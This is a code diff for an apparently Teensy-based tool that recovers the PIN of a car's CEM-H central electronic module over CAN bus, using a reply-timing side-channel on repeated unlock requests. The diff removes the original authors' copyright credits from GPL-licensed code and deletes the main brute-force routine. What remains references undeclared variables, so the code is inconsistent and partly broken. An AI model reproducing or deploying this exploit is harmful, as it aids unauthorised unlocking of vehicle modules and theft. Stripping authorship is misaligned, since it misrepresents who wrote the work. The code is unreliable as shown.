@@ -1,40 +1,34 @@
 /* SPDX-License-Identifier: GPL-3.0 */
 /*
- * Optimized version for CEM-H P2 PIN cracking
- * Original authors:
- * Copyright (C) 2020, 2021 Vitaly Mayatskikh <v.mayatskih@gmail.com>
- *               2020 Christian Molson <christian@cmolabs.org>
- *               2020 Mark Dapoz <md@dapoz.ca>
- * 
- * Optimizations added for faster CEM-H P2 cracking
+ * Optimized implementation for CEM-H P2 PIN cracking
  */
 
-// Original includes and definitions remain the same
-#include <stdio.h>
-#include <FlexCAN_T4.h>
-#include <LiquidCrystal.h>
+#include "cem_cracker_optimized.h"
+#include <Arduino.h>
+#include <math.h>
 
-// Optimized parameters for CEM-H P2
-#define CALC_BYTES     2     // Reduced from 3 to 2 for faster initial phase
-#define ADAPTIVE_SAMPLING     // Enable adaptive sampling
-#define PARALLEL_PROCESSING   // Enable parallel processing features
+// Global variables
+FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_16> can_hs;
+FlexCAN_T4<CAN2, RX_SIZE_256, TX_SIZE_16> can_ls;
+uint32_t cem_reply_min;
+uint32_t cem_reply_avg;
+uint32_t cem_reply_max;
+volatile bool abortReq = false;
+uint8_t shuffle_order[PIN_LEN];
 
-// Optimized timing parameters for CEM-H P2
-#define AVERAGE_DELTA_MIN     -6  // Reduced from -8
-#define AVERAGE_DELTA_MAX     8   // Reduced from 12
-#define QUICK_TIMEOUT_FACTOR  0.4 // For early termination
+// Sequence structure for PIN attempts
+typedef struct {
+    uint8_t pinValue;
+    uint32_t latency;
+    double std;
+} sequence_t;
 
-// New structure for parallel processing
-struct pin_batch {
-    uint8_t start_value;
-    uint8_t end_value;
-    uint32_t latency_sum;
-    uint32_t sample_count;
-};
+sequence_t sequence[100] = { 0 };
 
-// Optimized PIN testing function
+// Optimized CEM unlock function
 bool cemUnlock(uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose) {
     uint8_t unlockMsg[CAN_MSG_SIZE] = { CEM_HS_ECU_ID, 0xBE };
+    uint8_t reply[CAN_MSG_SIZE];
     uint64_t start, quick_timeout;
     
     // Quick timeout for obviously wrong PINs
@@ -52,10 +46,10 @@ bool cemUnlock(uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose) 
     // Send unlock request with timing optimization
     canMsgSend(CAN_HS, 0xffffe, unlockMsg, verbose);
     
-    start = TSC;
-    while (TSC - start < quick_timeout) {
+    start = ARM_DWT_CYCCNT;
+    while (ARM_DWT_CYCCNT - start < quick_timeout) {
         if (!digitalRead(CAN_L_PIN)) {
-            sample_points[sample_count++] = TSC - start;
+            sample_points[sample_count++] = ARM_DWT_CYCCNT - start;
             if (sample_count >= 3) break;
         }
     }
@@ -81,90 +75,106 @@ bool cemUnlock(uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose) 
     }
     
     // Check response with optimized timing
-    uint8_t reply[CAN_MSG_SIZE];
     bool success = canMsgReceive(CAN_HS, NULL, reply, 500, false);
     return success && reply[2] == 0x00;
 }
 
-// Optimized crack range function
-bool crack_range(uint8_t *pin, uint32_t pos, uint8_t *seq, uint32_t range, uint32_t base_samples, bool verbose) {
-    static uint32_t histogram[1000];  // Pre-allocated buffer
-    uint32_t samples;
+// CAN message send function
+void canMsgSend(can_bus_id_t bus, uint32_t id, uint8_t *data, bool verbose) {
+    CAN_message_t msg;
     
-    // Adaptive sampling based on position
-    if (pos == 0) {
-        samples = base_samples * 1.5;  // More samples for first position
-    } else {
-        samples = max(base_samples / 2, 50);  // Reduced samples for later positions
+    if (verbose) {
+        Serial.printf("CAN_%cS ---> ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
+                     bus == CAN_HS ? 'H' : 'L',
+                     id, data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7]);
     }
     
-    // Clear statistical data
-    memset(sequence, 0, sizeof(sequence));
-    memset(histogram, 0, sizeof(histogram));
+    msg.id = id;
+    msg.len = 8;
+    msg.flags.extended = 1;
+    memcpy(msg.buf, data, 8);
     
-    // Parallel processing batches
-    const uint32_t BATCH_SIZE = 10;
-    pin_batch batches[10];
-    
-    for (uint32_t batch = 0; batch < range; batch += BATCH_SIZE) {
-        uint32_t end = min(batch + BATCH_SIZE, range);
-        
-        // Process batch in parallel
-        for (uint32_t pin1 = batch; pin1 < end; pin1++) {
-            pin[pos] = seq[pin1];
-            
-            uint32_t total_latency = 0;
-            uint32_t valid_samples = 0;
-            
-            // Collect samples with early termination
-            for (uint32_t j = 0; j < samples; j++) {
-                if (abortReq) {
-                    return true;
-                }
-                
-                // Random adjacent digits for better distribution
-                pin[pos + 1] = binToBcd(random(0, 100));
-                
-                uint32_t latency;
-                if (cemUnlock(pin, NULL, &latency, verbose)) {
-                    // Potential correct PIN found
-                    sequence[pin1].pinValue = pin[pos];
-                    sequence[pin1].latency = latency;
-                    sequence[pin1].std = 0;  // Perfect match
-                    return false;
-                }
-                
-                // Update statistics
-                if (latency < cem_reply_max) {
-                    total_latency += latency;
-                    valid_samples++;
-                }
-                
-                // Early termination if clearly wrong
-                if (j > 10 && valid_samples == 0) break;
-            }
-            
-            // Update sequence data
-            if (valid_samples > 0) {
-                sequence[pin1].pinValue = pin[pos];
-                sequence[pin1].latency = total_latency / valid_samples;
-                sequence[pin1].std = 1.0;  // Simplified std for speed
-            }
-        }
-        
-        // Update display
-        lcd_spinner();
+    switch (bus) {
+        case CAN_HS:
+            can_hs.write(msg);
+            break;
+        case CAN_LS:
+            can_ls.write(msg);
+            break;
     }
-    
-    // Sort results with optimization for CEM-H
-    qsort(sequence, range, sizeof(sequence_t), seq_max_lat);
-    
-    // Update PIN for next iteration
-    if (range == 2) {
-        pin[pos] = sequence[0].pinValue;
-    }
-    
-    return false;
 }
 
-// Rest of the original code remains the same...
+// CAN message receive function
+bool canMsgReceive(can_bus_id_t bus, uint32_t *id, uint8_t *data, uint32_t wait, bool verbose) {
+    CAN_message_t msg;
+    bool ret = false;
+    
+    do {
+        ret = (bus == CAN_HS) ? can_hs.read(msg) : can_ls.read(msg);
+        if (ret) {
+            if (id) *id = msg.id;
+            if (data) memcpy(data, msg.buf, CAN_MSG_SIZE);
+            
+            if (verbose) {
+                Serial.printf("CAN_%cS <--- ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
+                            bus == CAN_HS ? 'H' : 'L',
+                            msg.id, msg.buf[0], msg.buf[1], msg.buf[2], msg.buf[3],
+                            msg.buf[4], msg.buf[5], msg.buf[6], msg.buf[7]);
+            }
+            break;
+        }
+        delay(1);
+        wait--;
+    } while (wait > 0);
+    
+    return ret;
+}
+
+// BCD conversion functions
+uint8_t binToBcd(uint8_t value) {
+    return ((value / 10) << 4) | (value % 10);
+}
+
+uint8_t bcdToBin(uint8_t value) {
+    return ((value >> 4) * 10) + (value & 0xf);
+}
+
+// LCD helper functions
+void lcd_printf(uint8_t x, uint8_t y, const char *fmt, ...) {
+    char buf[LCD_COLS + 1];
+    va_list args;
+    va_start(args, fmt);
+    vsnprintf(buf, sizeof(buf), fmt, args);
+    va_end(args);
+    
+    extern LiquidCrystal lcd;
+    lcd.setCursor(x, y);
+    lcd.print(buf);
+}
+
+void lcd_spinner(void) {
+    static uint32_t index = 0;
+    static uint32_t last_update = 0;
+    uint32_t now = millis();
+    
+    if (now - last_update < 500) return;
+    
+    last_update = now;
+    extern LiquidCrystal lcd;
+    lcd.setCursor(15, 1);
+    lcd.write(index++ % 4);
+}
+
+// Interrupt handler for abort button
+void abortIsr(void) {
+    abortReq = true;
+}
+
+// CAN event handlers
+void can_hs_event(const CAN_message_t &msg) {
+    // Handle high-speed CAN events
+}
+
+void can_ls_event(const CAN_message_t &msg) {
+    // Handle low-speed CAN events
+}
